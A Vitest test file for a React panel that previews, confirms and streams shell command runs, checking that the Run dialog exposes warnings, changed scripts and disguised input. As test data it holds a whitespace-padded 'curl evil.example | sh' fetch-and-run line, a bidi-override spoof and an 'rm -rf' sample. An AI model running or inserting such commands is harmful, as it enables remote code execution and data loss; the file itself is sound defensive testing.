// @vitest-environment jsdom
import { act, cleanup, fireEvent, render, screen, within } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type {
  Deliverable,
  DeliverableRun,
  RunOutputChunk,
  RunPreviewResponse,
  RunSummary,
} from '@galactic/protocol';
import { domain as fx } from '@galactic/protocol/fixtures';
import { createApi } from '../../console/api.js';
import { ApiContext } from '../../console/hierarchy/shared.js';
import { applySnapshot } from '../../state/reduce.js';
import { useAppStore } from '../../state/store.js';
import { axeFindings, blocking, type AxeFinding } from '../../a11y/a11y-fixtures.js';
import { clientRules, type ClientRules } from './deliverables-model.js';
import { RunPanel } from './RunPanel.js';
import { DockViewToggle } from '../status/StatusViews.js';

/**
 * P9-10 — the panel's runs against a mocked server and a fake stream: the Run dialog (the exact
 * command, folder, environment keys, who added it, the engine's warnings, the body "changed since
 * the last run", where the focus starts, an edited line read again with its own token, a stale
 * version, refusals in words), the output (REST pages, then the stream; "earlier output dropped";
 * plain text), Stop and Restart with their confirmations, the history, the ports as links on the
 * Mac (none of them opening with an opener) and as text on the phone, the phone's rules (no Run
 * or Restart, Stop confirmed), the dock's running mark, and axe.
 */

/** xterm.js stand-in: what was written and the options it was made with (jsdom has no canvas). */
const xterm = vi.hoisted(() => ({ writes: [] as string[], options: undefined as unknown }));
vi.mock('@xterm/xterm', () => ({
  Terminal: class {
    constructor(options: unknown) {
      xterm.options = options;
    }
    open() {}
    write(data: string) {
      xterm.writes.push(data);
    }
    reset() {
      xterm.writes.length = 0;
    }
    dispose() {}
  },
}));
vi.mock('@xterm/xterm/css/xterm.css', () => ({}));

const WS = fx.project.workspace;
const NOW = '2026-10-08T10:00:00.000Z';
const MAC = clientRules({ loopback: true, desktop: false, writable: 'all' });
const PHONE = clientRules({ loopback: false, desktop: false, writable: 'limited' });

const command = (over: Partial<Deliverable> = {}): Deliverable => ({
  id: 'd-dev',
  projectId: 'p-1',
  kind: 'command',
  title: 'dev',
  source: 'detected',
  addedBy: { type: 'system' },
  command: { line: 'pnpm run dev', cwd: WS, detectedFrom: 'package.json' },
  detectedKey: 'package.json#dev',
  version: 1,
  createdAt: NOW,
  updatedAt: NOW,
  ...over,
});

const preview = (over: Partial<RunPreviewResponse> = {}): RunPreviewResponse => ({
  deliverableId: 'd-dev',
  version: 1,
  line: 'pnpm run dev',
  cwd: WS,
  envKeys: ['HOME', 'LANG', 'PATH'],
  warnings: [],
  source: 'detected',
  addedBy: { type: 'system' },
  detectedFrom: 'package.json',
  body: 'vite --port 5173',
  confirmation: 'tok-stored',
  ...over,
});

const LIVE: RunSummary = { runId: 'r-1', state: 'running', startedAt: NOW, ports: [5173] };

const run = (over: Partial<DeliverableRun> = {}): DeliverableRun => ({
  id: 'r-2',
  deliverableId: 'd-dev',
  line: 'pnpm run dev',
  cwd: WS,
  state: 'running',
  startedAt: NOW,
  ports: [],
  startedBy: { type: 'user' },
  ...over,
});

const out = (seq: number, chunk: string, runId = 'r-1'): RunOutputChunk => ({
  runId,
  seq,
  at: NOW,
  chunk,
});

interface Call {
  method: string;
  path: string;
  body?: unknown;
}
let calls: Call[];
let routes: (method: string, path: string, body: unknown, query: URLSearchParams) => unknown;

const json = (body: unknown, status = 200) =>
  new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });

function fetchMock() {
  return vi.fn(async (input: string, init?: RequestInit) => {
    const method = init?.method ?? 'GET';
    const url = new URL(input, 'http://localhost');
    const body = init?.body ? JSON.parse(String(init.body)) : undefined;
    calls.push({ method, path: url.pathname + url.search, ...(body ? { body } : {}) });
    const answer = routes(method, url.pathname, body, url.searchParams);
    if (answer instanceof Response) return answer;
    if (answer !== undefined) return json(answer);
    if (url.pathname.endsWith('/run-preview')) return json(preview());
    if (url.pathname.endsWith('/runs') && method === 'GET') return json({ runs: [] });
    if (url.pathname.endsWith('/runs') && method === 'POST') return json({ run: run() }, 201);
    if (url.pathname.endsWith('/output')) return json({ runId: 'r-1', chunks: [], hasMore: false });
    return json({ ok: true });
  });
}

const subscribed: string[] = [];
const unsubscribed: string[] = [];

beforeEach(() => {
  useAppStore.getState().reset();
  useAppStore.setState({
    world: applySnapshot({
      logId: 'log-a',
      seq: 1,
      agents: [fx.harmonizer],
      bodies: [fx.body],
      projects: [fx.project],
      tasks: [fx.task],
      questions: [],
      proposals: [],
      statuses: [],
    }),
    subscribeRun: (id) => subscribed.push(id),
    unsubscribeRun: (id) => unsubscribed.push(id),
  });
  calls = [];
  routes = () => undefined;
  subscribed.length = 0;
  unsubscribed.length = 0;
  xterm.writes.length = 0;
});
afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  delete (globalThis as { __GALACTIC_DESKTOP__?: unknown }).__GALACTIC_DESKTOP__;
});

const flush = () => act(async () => new Promise((r) => setTimeout(r, 0)));

/** Puts the command (and its run) in the world, as the stream folds it. */
function inWorld(row: Deliverable) {
  const world = useAppStore.getState().world;
  useAppStore.setState({
    world: { ...world, deliverables: { ...world.deliverables, [row.id]: row } },
  });
}

async function show(row: Deliverable, rules: ClientRules = MAC) {
  inWorld(row);
  const api = createApi('tok', fetchMock() as unknown as typeof fetch);
  const utils = render(
    <ApiContext.Provider value={api}>
      <ul>
        <li>
          <RunPanel row={row} rules={rules} />
        </li>
      </ul>
    </ApiContext.Provider>,
  );
  await flush();
  return { ...utils, api };
}

const click = async (el: HTMLElement) => {
  await act(async () => {
    fireEvent.click(el);
    await Promise.resolve();
  });
  await flush();
};
const posts = (suffix: string) =>
  calls.filter((c) => c.method === 'POST' && c.path.endsWith(suffix));
const dialog = () => screen.getByRole('dialog');
const runButton = () => within(dialog()).getByRole('button', { name: /^(Run|Restart)$/ });

describe('the Run dialog (decision 129)', () => {
  it('shows the exact command, folder, environment keys, who added it and what it runs; Run sends the token', async () => {
    await show(command());
    const opener = screen.getByRole('button', { name: 'Run…' });
    await click(opener);
    const d = dialog();
    expect(d.getAttribute('aria-modal')).toBe('true');
    expect(within(d).getByRole('heading', { name: 'Run “dev”?' })).toBeTruthy();
    expect((within(d).getByLabelText('The exact command') as HTMLInputElement).value).toBe(
      'pnpm run dev',
    );
    expect(d.textContent).toContain(WS);
    expect(d.textContent).toContain('found in package.json');
    for (const k of ['HOME', 'LANG', 'PATH']) expect(within(d).getByText(k)).toBeTruthy();
    expect(d.textContent).toContain('the values are never shown');
    expect(d.textContent).toContain('No warnings read in this command.');
    expect(within(d).getByLabelText("the script's body").textContent).toContain('vite --port 5173');
    // No warning, no changed body: the focus starts on Run.
    expect(document.activeElement).toBe(runButton());
    await click(runButton());
    expect(posts('/api/deliverables/d-dev/runs')).toEqual([
      {
        method: 'POST',
        path: '/api/deliverables/d-dev/runs',
        body: { version: 1, confirmation: 'tok-stored' },
      },
    ]);
    // Started: the dialog closes and the output opens.
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(screen.getByRole('region', { name: 'output' })).toBeTruthy();
  });

  it('shows the engine’s warnings and a body changed since the last run; the focus starts on Cancel', async () => {
    routes = (method, path) =>
      path.endsWith('/run-preview')
        ? preview({
            warnings: ['deletes or overwrites files', 'uses the network'],
            reasons: ['rm -rf dist: destructive'],
            body: 'rm -rf dist && vite\nexport X=1',
            bodyChanged: true,
            lastRunBody: 'vite\nexport X=1',
          })
        : undefined;
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    const d = dialog();
    const warnings = within(d).getByRole('group', { name: 'warnings' });
    expect(warnings.textContent).toContain('deletes or overwrites files');
    expect(warnings.textContent).toContain('uses the network');
    expect(warnings.textContent).toContain('rm -rf dist: destructive');
    expect(d.textContent).toContain('changed since the last run');
    const changed = [...d.querySelectorAll('mark.run-body-changed')].map((m) => m.textContent);
    expect(changed).toEqual(['rm -rf dist && vite\n']);
    expect(document.activeElement).toBe(within(d).getByRole('button', { name: 'Cancel' }));
    // Escape cancels and the focus goes back to Run….
    fireEvent.keyDown(d, { key: 'Escape' });
    await flush();
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(document.activeElement).toBe(screen.getByRole('button', { name: 'Run…' }));
    expect(posts('/runs')).toHaveLength(0);
  });

  it('keeps the focus inside (Tab cycles) and Enter in the field never runs', async () => {
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    const d = dialog();
    const cancel = within(d).getByRole('button', { name: 'Cancel' });
    cancel.focus();
    fireEvent.keyDown(d, { key: 'Tab' });
    expect(d.contains(document.activeElement)).toBe(true);
    expect(document.activeElement).not.toBe(cancel);
    const field = within(d).getByLabelText('The exact command');
    fireEvent.keyDown(field, { key: 'Enter' });
    await flush();
    expect(posts('/runs')).toHaveLength(0);
  });

  it('reads an edited line again (debounced) and runs it with its own token and warnings', async () => {
    routes = (method, path, body) => {
      if (path.endsWith('/run-preview') && method === 'POST') {
        const line = (body as { line: string }).line;
        return preview({ line, warnings: ['may push'], confirmation: `tok:${line}` });
      }
      return undefined;
    };
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    const field = within(dialog()).getByLabelText('The exact command');
    fireEvent.change(field, { target: { value: 'pnpm run dev && git push' } });
    // While the edit is read, Run waits.
    expect((runButton() as HTMLButtonElement).disabled).toBe(true);
    expect(dialog().textContent).toContain('Edited for this run only');
    await vi.waitFor(() => expect(dialog().textContent).toContain('may push'));
    expect(posts('/run-preview')).toEqual([
      {
        method: 'POST',
        path: '/api/deliverables/d-dev/run-preview',
        body: { line: 'pnpm run dev && git push' },
      },
    ]);
    expect((runButton() as HTMLButtonElement).disabled).toBe(false);
    await click(runButton());
    expect(posts('/api/deliverables/d-dev/runs')[0]!.body).toEqual({
      version: 1,
      line: 'pnpm run dev && git push',
      confirmation: 'tok:pnpm run dev && git push',
    });
  });

  it('refuses an edit still holding a masked secret (the server’s words), and Run stays off', async () => {
    routes = (method, path, body) => {
      if (path.endsWith('/run-preview') && method === 'GET') {
        return preview({ line: 'deploy --token [redacted:token]' });
      }
      if (path.endsWith('/run-preview') && method === 'POST') {
        return json(
          {
            error: 'invalid',
            message:
              'The command still holds a hidden secret ([redacted:…]): type it again, or run the stored command unedited.',
          },
          400,
        );
      }
      void body;
      return undefined;
    };
    await show(command({ command: { line: 'deploy --token x', cwd: WS } }));
    await click(screen.getByRole('button', { name: 'Run…' }));
    const field = within(dialog()).getByLabelText('The exact command');
    expect((field as HTMLInputElement).value).toBe('deploy --token [redacted:token]');
    fireEvent.change(field, { target: { value: 'deploy --token [redacted:token] --prod' } });
    await vi.waitFor(() => expect(dialog().textContent).toContain('hidden secret'));
    expect((runButton() as HTMLButtonElement).disabled).toBe(true);
    // Back to the stored (masked) line: not an edit, the stored token runs it.
    fireEvent.change(field, { target: { value: 'deploy --token [redacted:token]' } });
    await flush();
    expect((runButton() as HTMLButtonElement).disabled).toBe(false);
    await click(runButton());
    expect(posts('/runs')[0]!.body).toEqual({ version: 1, confirmation: 'tok-stored' });
  });

  it('a stale version is refused: the dialog shows the new command and asks again', async () => {
    let version = 1;
    routes = (method, path) => {
      if (path.endsWith('/run-preview')) {
        return version === 1
          ? preview()
          : preview({ version: 2, line: 'pnpm run dev --host', confirmation: 'tok-v2' });
      }
      if (path.endsWith('/runs') && method === 'POST') {
        if (version === 1) {
          version = 2;
          return json(
            {
              error: 'stale',
              message: 'The command changed since the dialog opened: check it again.',
              deliverable: command({ version: 2 }),
            },
            409,
          );
        }
        return json({ run: run() }, 201);
      }
      return undefined;
    };
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    await click(runButton());
    const d = dialog();
    expect(within(d).getByRole('alert').textContent).toContain('The command changed');
    expect((within(d).getByLabelText('The exact command') as HTMLInputElement).value).toBe(
      'pnpm run dev --host',
    );
    expect(posts('/runs')).toHaveLength(1);
    await click(runButton());
    expect(posts('/runs')[1]!.body).toEqual({ version: 2, confirmation: 'tok-v2' });
  });

  it('reads the command again when its version moves on the stream while the dialog is open', async () => {
    const { rerender, api } = await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    routes = (_m, path) =>
      path.endsWith('/run-preview')
        ? preview({ version: 2, line: 'pnpm run start', confirmation: 'tok-v2' })
        : undefined;
    rerender(
      <ApiContext.Provider value={api}>
        <ul>
          <li>
            <RunPanel row={command({ version: 2 })} rules={MAC} />
          </li>
        </ul>
      </ApiContext.Provider>,
    );
    await flush();
    expect(dialog().textContent).toContain('changed since the dialog opened');
    expect((within(dialog()).getByLabelText('The exact command') as HTMLInputElement).value).toBe(
      'pnpm run start',
    );
  });

  it.each([
    [
      'run_cap',
      409,
      'At most 4 runs at once: stop one first.',
      'At most 4 runs at once: stop one first.',
    ],
    ['folder', 409, 'x', 'no longer one a run may use'],
    ['remote_control', 403, 'x', 'Commands are run from the Mac only.'],
    ['start_failed', 500, 'The command could not start: ENOENT', 'could not start: ENOENT'],
    ['storage', 507, 'x', 'The disk is full'],
    ['storage', 503, 'x', 'cannot write to its database'],
  ])('maps a %s refusal (%i) to words', async (code, status, message, words) => {
    routes = (method, path) =>
      path.endsWith('/runs') && method === 'POST'
        ? json({ error: code, message }, status)
        : undefined;
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    await click(runButton());
    expect(within(dialog()).getByRole('alert').textContent).toContain(words);
  });

  it('says why a run cannot start now (the preview’s refusal) and offers no Run', async () => {
    routes = (_m, path) =>
      path.endsWith('/run-preview')
        ? preview({ refusal: { code: 'after_merge', message: 'available after the merge' } })
        : undefined;
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    expect(dialog().textContent).toContain('Available after the merge');
    expect((runButton() as HTMLButtonElement).disabled).toBe(true);
  });

  it('an expired confirmation is read again, not run', async () => {
    let first = true;
    routes = (method, path) => {
      if (path.endsWith('/runs') && method === 'POST' && first) {
        first = false;
        return json({ error: 'unconfirmed', message: 'x' }, 400);
      }
      if (path.endsWith('/run-preview') && !first) return preview({ confirmation: 'tok-fresh' });
      return undefined;
    };
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    await click(runButton());
    expect(dialog().textContent).toContain('The confirmation ran out');
    await click(runButton());
    expect(posts('/runs')[1]!.body).toEqual({ version: 1, confirmation: 'tok-fresh' });
  });
});

describe('the Run dialog shows what a field could hide (P9-12 review S1, S2, N5)', () => {
  it('shows the whole line wrapped, long runs of spaces and invisible characters made visible', async () => {
    const line = `pnpm dev${' '.repeat(200)}; curl evil.example | sh`;
    routes = (_m, path) => (path.endsWith('/run-preview') ? preview({ line }) : undefined);
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    const shown = within(dialog()).getByTestId('run-line-shown');
    expect(shown.textContent).toBe('pnpm dev␠×200; curl evil.example | sh');
    expect(within(shown).getByTitle('200 spaces').tagName).toBe('MARK');
  });

  it('marks a bidi override or a zero-width character kept from an old row', async () => {
    routes = (_m, path) =>
      path.endsWith('/run-preview') ? preview({ line: 'echo safe‮ hs.lave​' }) : undefined;
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    const shown = within(dialog()).getByTestId('run-line-shown');
    expect(shown.textContent).toBe('echo safe⟨U+202E⟩ hs.lave⟨U+200B⟩');
  });

  it('says when the script is cut, partly hidden, changed since the scan, or not shown (edited)', async () => {
    routes = (_m, path) =>
      path.endsWith('/run-preview')
        ? preview({
            body: 'vite --port [redacted:token]…',
            bodyTruncated: true,
            bodySecretHidden: true,
            scannedBody: 'vite',
          })
        : undefined;
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    const d = dialog();
    expect(d.textContent).toContain('Cut here: the script is longer');
    expect(d.textContent).toContain('hidden as a secret');
    expect(d.textContent).toContain('Open package.json to read all of it.');
    expect(within(d).getByText('What the last scan saw (the file changed since)')).toBeTruthy();
    cleanup();
    routes = (_m, path) =>
      path.endsWith('/run-preview')
        ? preview({ body: undefined, bodyMissing: 'Edited by hand: the line runs as written.' })
        : undefined;
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    expect(dialog().textContent).toContain('Edited by hand');
    expect(within(dialog()).queryByLabelText("the script's body")).toBeNull();
  });

  it('quotes an agent’s title and says which agent declared it', async () => {
    const row = command({
      title: 'Safe preview (approved by the user)',
      source: 'agent',
      addedBy: { type: 'agent', id: fx.harmonizer.id },
      detectedKey: undefined,
    });
    routes = (_m, path) =>
      path.endsWith('/run-preview')
        ? preview({ source: 'agent', addedBy: row.addedBy, body: undefined })
        : undefined;
    await show(row);
    await click(screen.getByRole('button', { name: 'Run…' }));
    const d = dialog();
    expect(
      within(d).getByRole('heading', { name: 'Run “Safe preview (approved by the user)”?' }),
    ).toBeTruthy();
    expect(d.querySelector('.run-declared')!.textContent).toMatch(/an agent’s words.*declared by/);
  });
});

describe('a live run: state, ports, Stop, Restart, output, history', () => {
  it('shows the state and the ports as links without an opener', async () => {
    await show(command({ lastRun: LIVE }));
    expect(document.body.textContent).toContain('running · :5173');
    const link = screen.getByRole('link', { name: 'http://localhost:5173' });
    expect(link.getAttribute('href')).toBe('http://localhost:5173');
    expect(link.getAttribute('target')).toBe('_blank');
    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    expect(screen.queryByRole('button', { name: 'Run…' })).toBeNull();
  });

  it('in the desktop app a port link is a plain link (the shell opens it in the default browser)', async () => {
    (globalThis as { __GALACTIC_DESKTOP__?: unknown }).__GALACTIC_DESKTOP__ = {
      shell: 'tauri',
      notifications: 'shell',
    };
    await show(
      command({ lastRun: LIVE }),
      clientRules({ loopback: true, desktop: true, writable: 'all' }),
    );
    const link = screen.getByRole('link', { name: 'http://localhost:5173' });
    expect(link.getAttribute('target')).toBeNull();
  });

  it('Stop asks first, then stops', async () => {
    await show(command({ lastRun: LIVE }));
    await click(screen.getByRole('button', { name: 'Stop' }));
    const confirm = screen.getByRole('group', { name: 'confirm' });
    expect(confirm.textContent).toContain(
      'Stop dev? It ends the command and everything it started.',
    );
    expect(posts('/stop')).toHaveLength(0);
    await click(within(confirm).getByRole('button', { name: 'Stop' }));
    expect(posts('/stop')).toEqual([{ method: 'POST', path: '/api/runs/r-1/stop' }]);
  });

  it('Restart confirms again (a running refusal of the preview does not count) and restarts', async () => {
    routes = (method, path) =>
      path.endsWith('/run-preview')
        ? preview({ refusal: { code: 'running', message: 'already running' } })
        : path.endsWith('/restart')
          ? json({ run: run() }, 201)
          : undefined;
    await show(command({ lastRun: LIVE }));
    await click(screen.getByRole('button', { name: 'Restart…' }));
    expect(within(dialog()).getByRole('heading', { name: 'Restart “dev”?' })).toBeTruthy();
    expect(dialog().textContent).not.toContain('already running');
    await click(runButton());
    expect(posts('/restart')).toEqual([
      {
        method: 'POST',
        path: '/api/runs/r-1/restart',
        body: { version: 1, confirmation: 'tok-stored' },
      },
    ]);
  });

  it('announces a state change in a live region (not the output)', async () => {
    await show(command({ lastRun: LIVE }));
    const region = screen.getByRole('status');
    expect(region.textContent).toBe('');
    act(() =>
      inWorld(
        command({
          lastRun: { ...LIVE, state: 'ended', outcome: 'exited', exitCode: 1, endedAt: NOW },
        }),
      ),
    );
    expect(region.textContent).toBe('dev: exited 1');
    await click(screen.getByRole('button', { name: 'Output' }));
    const output = screen.getByRole('region', { name: 'output' });
    expect(output.closest('[aria-live]')).toBeNull();
    expect(output.querySelector('[aria-live]')).toBeNull();
  });

  it('shows the output: REST pages first, then the stream from the newest seq; plain text', async () => {
    routes = (_m, path, _b, q) => {
      if (!path.endsWith('/output')) return undefined;
      return q.get('after') === '0'
        ? {
            runId: 'r-1',
            chunks: [out(3, '\x1b[32mready\x1b[0m\n')],
            truncatedBefore: 2,
            hasMore: true,
          }
        : { runId: 'r-1', chunks: [out(4, 'http://localhost:5173\n')], hasMore: false };
    };
    await show(command({ lastRun: LIVE }));
    await click(screen.getByRole('button', { name: 'Output' }));
    await vi.waitFor(() => expect(subscribed).toEqual(['r-1']));
    expect(calls.filter((c) => c.path.includes('/output')).map((c) => c.path)).toEqual([
      '/api/runs/r-1/output?after=0&limit=1000',
      '/api/runs/r-1/output?after=3&limit=1000',
    ]);
    await vi.waitFor(() =>
      expect(xterm.writes).toEqual(['\x1b[32mready\x1b[0m\n', 'http://localhost:5173\n']),
    );
    expect(xterm.options).toMatchObject({ disableStdin: true, convertEol: true });
    expect(screen.getByText(/Earlier output dropped/)).toBeTruthy();
    // A live batch from the stream (and a repeat of one already held).
    act(() =>
      useAppStore.getState().apply({
        type: 'run_output',
        runId: 'r-1',
        chunks: [out(4, 'http://localhost:5173\n'), out(5, 'GET / 200\n')],
      }),
    );
    expect(xterm.writes.at(-1)).toBe('GET / 200\n');
    expect(xterm.writes).toHaveLength(3);
    await click(screen.getByRole('button', { name: 'Plain text' }));
    expect(screen.getByLabelText('the output as text').textContent).toBe(
      'ready\nhttp://localhost:5173\nGET / 200\n',
    );
    // Closing the output unsubscribes and forgets it.
    await click(screen.getByRole('button', { name: 'Hide output' }));
    expect(unsubscribed).toEqual(['r-1']);
    expect(useAppStore.getState().runOutputs['r-1']).toBeUndefined();
  });

  it('lists the runs with outcome, duration and ports, and shows an earlier run’s output', async () => {
    routes = (method, path) =>
      path.endsWith('/runs') && method === 'GET'
        ? {
            runs: [
              run({ id: 'r-1', state: 'running', ports: [5173] }),
              run({
                id: 'r-0',
                state: 'ended',
                outcome: 'exited',
                exitCode: 1,
                startedAt: '2026-10-08T09:00:00.000Z',
                endedAt: '2026-10-08T09:02:05.000Z',
                ports: [3000],
                line: 'pnpm run dev --debug',
                meta: { edited: true },
              }),
              run({
                id: 'r-old',
                state: 'ended',
                outcome: 'stopped',
                reason: 'server_restarted',
                startedAt: '2026-10-08T08:00:00.000Z',
                endedAt: '2026-10-08T08:00:03.000Z',
              }),
            ],
          }
        : undefined;
    await show(command({ lastRun: LIVE }));
    await click(screen.getByRole('button', { name: 'Runs' }));
    const list = screen.getByRole('region', { name: 'runs' });
    const items = within(list).getAllByRole('listitem');
    expect(items[1]!.textContent).toContain('exited 1 · 2 min 5 s · :3000');
    expect(items[1]!.textContent).toContain('edited: pnpm run dev --debug');
    expect(items[2]!.textContent).toContain('stopped — Mission Control restarted · 3 s');
    await click(within(items[1]!).getByRole('button', { name: 'Output' }));
    expect(screen.getByRole('heading', { name: 'Output of an earlier run' })).toBeTruthy();
    await vi.waitFor(() => expect(subscribed).toContain('r-0'));
  });
});

describe('the phone (decision 131)', () => {
  it('shows state, ports as text and Stop (confirmed), never Run or Restart', async () => {
    await show(command({ lastRun: LIVE }), PHONE);
    expect(screen.queryByRole('button', { name: 'Run…' })).toBeNull();
    expect(screen.queryByRole('button', { name: 'Restart…' })).toBeNull();
    expect(screen.getByText('Restart: on the Mac')).toBeTruthy();
    expect(screen.queryByRole('link')).toBeNull();
    expect(document.body.textContent).toContain('http://localhost:5173');
    expect(document.body.textContent).toContain('on the Mac: open it in the Mac’s browser');
    await click(screen.getByRole('button', { name: 'Stop' }));
    await click(
      within(screen.getByRole('group', { name: 'confirm' })).getByRole('button', { name: 'Stop' }),
    );
    expect(posts('/stop')).toHaveLength(1);
  });

  it('a stopped command says Run is on the Mac', async () => {
    await show(
      command({ lastRun: { ...LIVE, state: 'ended', outcome: 'stopped', endedAt: NOW } }),
      PHONE,
    );
    expect(screen.getByText('Run: on the Mac')).toBeTruthy();
    expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull();
    expect(screen.getByRole('button', { name: 'Output' })).toBeTruthy();
  });
});

describe('the dock’s running mark', () => {
  it('shows ▶ on Deliverables while a run of the project lives', () => {
    inWorld(command({ lastRun: LIVE }));
    render(<DockViewToggle role="waykeeper" projectId="p-1" />);
    const button = screen.getByRole('button', { name: /Deliverables/ });
    expect(button.textContent).toContain('▶');
    expect(button.textContent).toContain('1 command running');
    cleanup();
    inWorld(command({ lastRun: { ...LIVE, state: 'ended', outcome: 'exited', exitCode: 0 } }));
    render(<DockViewToggle role="waykeeper" projectId="p-1" />);
    expect(screen.getByRole('button', { name: 'Deliverables' }).textContent).toBe('Deliverables');
  });
});

describe('axe (decision 81)', () => {
  it('passes on the run view, its output, its history and the Run dialog', async () => {
    await show(command({ lastRun: LIVE }));
    await click(screen.getByRole('button', { name: 'Output' }));
    await click(screen.getByRole('button', { name: 'Runs' }));
    expect(blocking(await axeFindings()), 'run view').toEqual<AxeFinding[]>([]);
    await click(screen.getByRole('button', { name: 'Plain text' }));
    expect(blocking(await axeFindings()), 'plain text').toEqual<AxeFinding[]>([]);
    cleanup();
    routes = (_m, path) =>
      path.endsWith('/run-preview')
        ? preview({ warnings: ['uses the network'], bodyChanged: true, lastRunBody: 'vite' })
        : undefined;
    await show(command());
    await click(screen.getByRole('button', { name: 'Run…' }));
    expect(blocking(await axeFindings()), 'dialog').toEqual<AxeFinding[]>([]);
  });
});
